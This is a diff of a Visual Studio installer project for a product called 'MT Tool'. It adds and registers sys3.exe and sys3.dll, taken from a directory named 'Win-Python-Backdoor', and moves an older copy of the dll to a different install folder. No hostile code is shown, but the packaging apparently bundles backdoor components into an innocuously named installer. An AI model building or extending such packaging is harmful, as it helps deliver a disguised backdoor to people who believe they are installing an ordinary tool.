@@ -45,6 +45,18 @@
         }
         "Entry"
         {
+        "MsmKey" = "8:_6C65F922F62F40EEB8D414594DF44F13"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
+        "MsmKey" = "8:_6F63DE0AF4664CC3AAABB584A6825C83"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
         "MsmKey" = "8:_83A8D650AF654ED1BCE57A1A31342EAD"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
@@ -58,12 +70,6 @@
         "Entry"
         {
         "MsmKey" = "8:_A6DD2A41348A462E87241B925E33E0A1"
-        "OwnerKey" = "8:_UNDEFINED"
-        "MsmSig" = "8:_UNDEFINED"
-        }
-        "Entry"
-        {
-        "MsmKey" = "8:_EDA2BE57C7A44BBBBBF1F03BD811E313"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
@@ -275,6 +281,46 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_6C65F922F62F40EEB8D414594DF44F13"
+            {
+            "SourcePath" = "8:..\\..\\C++\\Release\\sys3.exe"
+            "TargetName" = "8:sys3.exe"
+            "Tag" = "8:"
+            "Folder" = "8:_A4A286D4624E4C09A4C2E55D48F6201A"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:FALSE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_6F63DE0AF4664CC3AAABB584A6825C83"
+            {
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\sys3.dll"
+            "TargetName" = "8:sys3.dll"
+            "Tag" = "8:"
+            "Folder" = "8:_A4A286D4624E4C09A4C2E55D48F6201A"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:FALSE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_83A8D650AF654ED1BCE57A1A31342EAD"
             {
             "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\libssl-1_1.dll"
@@ -328,26 +374,6 @@
             "Hidden" = "11:FALSE"
             "System" = "11:TRUE"
             "Permanent" = "11:TRUE"
-            "SharedLegacy" = "11:FALSE"
-            "PackageAs" = "3:1"
-            "Register" = "3:1"
-            "Exclude" = "11:FALSE"
-            "IsDependency" = "11:FALSE"
-            "IsolateTo" = "8:"
-            }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_EDA2BE57C7A44BBBBBF1F03BD811E313"
-            {
-            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\sys3.dll"
-            "TargetName" = "8:sys3.dll"
-            "Tag" = "8:"
-            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
-            "Condition" = "8:"
-            "Transitive" = "11:FALSE"
-            "Vital" = "11:TRUE"
-            "ReadOnly" = "11:FALSE"
-            "Hidden" = "11:FALSE"
-            "System" = "11:FALSE"
-            "Permanent" = "11:FALSE"
             "SharedLegacy" = "11:FALSE"
             "PackageAs" = "3:1"
             "Register" = "3:1"
@@ -455,7 +481,7 @@
         "Name" = "8:Microsoft Visual Studio"
         "ProductName" = "8:MT Tool"
         "ProductCode" = "8:{98F8450D-4A66-4E18-8FCE-08606DE0F6C6}"
-        "PackageCode" = "8:{418AC5C5-0A08-43DE-B37E-38885468F313}"
+        "PackageCode" = "8:{7BBF9B2E-5247-4B76-B7D6-FDCF726A32BE}"
         "UpgradeCode" = "8:{C3C953E8-4B5D-4005-9499-3D2A2CF54F8C}"
         "AspNetVersion" = "8:4.0.30319.0"
         "RestartWWWService" = "11:FALSE"
